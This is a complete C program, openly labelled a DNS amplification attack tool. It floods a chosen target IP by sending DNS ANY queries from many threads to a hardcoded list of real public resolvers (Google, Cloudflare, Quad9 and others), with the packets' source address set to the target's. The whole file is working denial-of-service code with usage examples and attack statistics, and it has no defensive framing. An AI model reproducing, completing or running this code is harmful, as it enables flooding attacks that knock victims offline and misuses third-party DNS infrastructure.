#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <time.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>

#define MAX_THREADS 5000
#define STATUS_UPDATE_INTERVAL 2
#define DNS_QUERY_SIZE 64
#define MAX_DNS_SERVERS 100

typedef struct {
    int thread_id;
    volatile unsigned long *packet_count;
    volatile int *running;
    char dns_server[16];
    char target_ip[16];
    int query_id;
} thread_data_t;

typedef struct {
    char target_ip[16];
    int duration;
    int thread_count;
    volatile int running;
    unsigned long total_packets;
    char dns_servers[MAX_DNS_SERVERS][16];
    int dns_server_count;
} config_t;

config_t config;

// DNS header structure
struct dns_header {
    unsigned short id;
    unsigned short flags;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
};

// Function prototypes
void print_banner(void);
void init_config(int argc, char *argv[]);
void validate_arguments(void);
void setup_signal_handlers(void);
void handle_signal(int sig);
void print_status(volatile unsigned long *packet_counts, int thread_count);
void *dns_amplification_thread(void *arg);
unsigned long get_time_ms(void);
void load_dns_servers(void);
unsigned short checksum(unsigned short *ptr, int nbytes);

void print_banner(void) {
    printf("=========================================\n");
    printf("        DNS AMPLIFICATION ATTACK TOOL\n");
    printf("=========================================\n");
}

void init_config(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <TARGET_IP> <DURATION> [THREADS]\n", argv[0]);
        printf("Example: %s 192.168.1.100 60 1000\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.duration = atoi(argv[2]);
    config.thread_count = (argc > 3) ? atoi(argv[3]) : 1000;
    config.running = 0;
    config.total_packets = 0;
    config.dns_server_count = 0;
    
    load_dns_servers();
}

void load_dns_servers(void) {
    // List of public DNS servers for amplification
    const char *servers[] = {
        "8.8.8.8", "8.8.4.4",                   // Google DNS
        "1.1.1.1", "1.0.0.1",                   // Cloudflare
        "9.9.9.9", "149.112.112.112",           // Quad9
        "208.67.222.222", "208.67.220.220",     // OpenDNS
        "64.6.64.6", "64.6.65.6",               // Verisign
        "84.200.69.80", "84.200.70.40",         // DNS.WATCH
        "8.26.56.26", "8.20.247.20",            // Comodo
        "195.46.39.39", "195.46.39.40",         // SafeDNS
        "77.88.8.8", "77.88.8.1",               // Yandex
        "176.103.130.130", "176.103.130.131",   // AdGuard
        "156.154.70.1", "156.154.71.1",         // Neustar
        "185.228.168.9", "185.228.169.9",       // CleanBrowsing
        "76.76.19.19", "76.223.122.150",        // Alternate DNS
        "94.140.14.14", "94.140.15.15",         // AdGuard DNS
        "4.2.2.1", "4.2.2.2", "4.2.2.3", "4.2.2.4", "4.2.2.5", "4.2.2.6" // Level3
    };
    
    int count = sizeof(servers) / sizeof(servers[0]);
    for (int i = 0; i < count && i < MAX_DNS_SERVERS; i++) {
        strncpy(config.dns_servers[i], servers[i], sizeof(config.dns_servers[i]) - 1);
        config.dns_server_count++;
    }
    
    printf("[+] Loaded %d DNS servers\n", config.dns_server_count);
}

void validate_arguments(void) {
    if (config.duration < 1) {
        fprintf(stderr, "Error: Duration must be at least 1 second\n");
        exit(EXIT_FAILURE);
    }
    
    if (config.thread_count < 1 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, "Error: Thread count must be between 1 and %d\n", MAX_THREADS);
        exit(EXIT_FAILURE);
    }
    
    struct in_addr addr;
    if (inet_pton(AF_INET, config.target_ip, &addr) != 1) {
        fprintf(stderr, "Error: Invalid target IP address format\n");
        exit(EXIT_FAILURE);
    }
}

void setup_signal_handlers(void) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
}

void handle_signal(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    config.running = 0;
}

void print_status(volatile unsigned long *packet_counts, int thread_count) {
    static int update_count = 0;
    unsigned long total = 0;
    
    for (int i = 0; i < thread_count; i++) {
        total += packet_counts[i];
    }
    
    printf("[%02d] Total amplified packets: %lu | Current PPS: %.2f\n", 
           ++update_count, total, (float)total / ((update_count) * STATUS_UPDATE_INTERVAL));
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

void *dns_amplification_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    
    // Create raw socket for IP spoofing
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Raw socket creation failed");
        return NULL;
    }
    
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt failed");
        close(sock);
        return NULL;
    }
    
    // Prepare DNS query (ANY query for maximum amplification)
    char dns_query[DNS_QUERY_SIZE];
    struct dns_header *dns_hdr = (struct dns_header *)dns_query;
    
    // Initialize DNS header
    dns_hdr->id = htons(data->query_id);
    dns_hdr->flags = htons(0x0100); // Standard query
    dns_hdr->qdcount = htons(1);    // One question
    dns_hdr->ancount = 0;
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;
    
    // Add question (google.com for large response)
    char *qname = dns_query + sizeof(struct dns_header);
    strcpy(qname, "\x06google\x03com\x00"); // google.com
    unsigned short *qtype = (unsigned short *)(qname + strlen("\x06google\x03com\x00") + 1);
    *qtype = htons(0x00ff); // ANY query type for maximum amplification
    
    unsigned short *qclass = qtype + 1;
    *qclass = htons(0x0001); // IN class
    
    int query_len = sizeof(struct dns_header) + strlen("\x06google\x03com\x00") + 1 + 4;
    
    // Prepare IP and UDP headers
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    // Copy DNS query to payload
    memcpy(payload, dns_query, query_len);
    
    // Set up UDP header
    udp->source = htons(53); // Spoof source port as DNS
    udp->dest = htons(53);   // Destination port DNS
    udp->len = htons(sizeof(struct udphdr) + query_len);
    udp->check = 0; // Will be calculated later
    
    // Set up IP header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + query_len;
    ip->id = htons(data->query_id);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(data->target_ip); // Spoof source IP as target
    ip->daddr = inet_addr(data->dns_server); // DNS server
    
    // Calculate IP checksum
    ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(data->dns_server);
    
    while (*(data->running)) {
        // Update query ID for each packet
        dns_hdr->id = htons(rand() % 65535);
        ip->id = htons(rand() % 65535);
        ip->saddr = inet_addr(data->target_ip); // Keep spoofing target IP
        
        // Send the spoofed DNS query
        if (sendto(sock, packet, ip->tot_len, 0, 
                  (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            (*(data->packet_count))++;
        }
        
        // Small delay to avoid overwhelming the system
        usleep(10);
    }
    
    close(sock);
    return NULL;
}

unsigned long get_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (ts.tv_sec * 1000) + (ts.tv_nsec / 1000000);
}

int main(int argc, char *argv[]) {
    pthread_t *threads = NULL;
    thread_data_t *thread_data = NULL;
    volatile unsigned long *packet_counts = NULL;
    unsigned long start_time, current_time, elapsed_time;
    
    print_banner();
    init_config(argc, argv);
    validate_arguments();
    setup_signal_handlers();
    
    printf("[+] Target: %s\n", config.target_ip);
    printf("[+] Duration: %d seconds\n", config.duration);
    printf("[+] Threads: %d\n", config.thread_count);
    printf("[+] DNS Servers: %d\n", config.dns_server_count);
    printf("[+] Starting DNS amplification attack...\n\n");
    
    // Allocate memory
    threads = malloc(config.thread_count * sizeof(pthread_t));
    thread_data = malloc(config.thread_count * sizeof(thread_data_t));
    packet_counts = malloc(config.thread_count * sizeof(unsigned long));
    
    if (!threads || !thread_data || !packet_counts) {
        perror("Memory allocation failed");
        return EXIT_FAILURE;
    }
    
    // Initialize packet counters
    memset((void*)packet_counts, 0, config.thread_count * sizeof(unsigned long));
    
    // Create worker threads
    srand(time(NULL));
    for (int i = 0; i < config.thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].packet_count = &packet_counts[i];
        thread_data[i].running = &config.running;
        thread_data[i].query_id = rand() % 65535;
        
        // Assign DNS server in round-robin fashion
        strncpy(thread_data[i].dns_server, 
                config.dns_servers[i % config.dns_server_count],
                sizeof(thread_data[i].dns_server) - 1);
        
        strncpy(thread_data[i].target_ip, config.target_ip, sizeof(thread_data[i].target_ip) - 1);
        
        if (pthread_create(&threads[i], NULL, dns_amplification_thread, (void*)&thread_data[i]) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }
    
    config.running = 1;
    start_time = get_time_ms();
    
    // Main control loop
    while (config.running) {
        sleep(STATUS_UPDATE_INTERVAL);
        print_status(packet_counts, config.thread_count);
        
        current_time = get_time_ms();
        elapsed_time = (current_time - start_time) / 1000;
        
        if (elapsed_time >= config.duration) {
            config.running = 0;
            break;
        }
    }
    
    // Wait for threads to finish
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Calculate statistics
    unsigned long total_packets = 0;
    for (int i = 0; i < config.thread_count; i++) {
        total_packets += packet_counts[i];
    }
    
    printf("\n[+] Attack completed!\n");
    printf("[+] Total spoofed DNS queries sent: %lu\n", total_packets);
    printf("[+] Average queries per second: %.2f\n", (float)total_packets / config.duration);
    printf("[+] Estimated amplification: 50-100x (depending on DNS server)\n");
    
    free(threads);
    free(thread_data);
    free((void*)packet_counts);
    
    return EXIT_SUCCESS;
}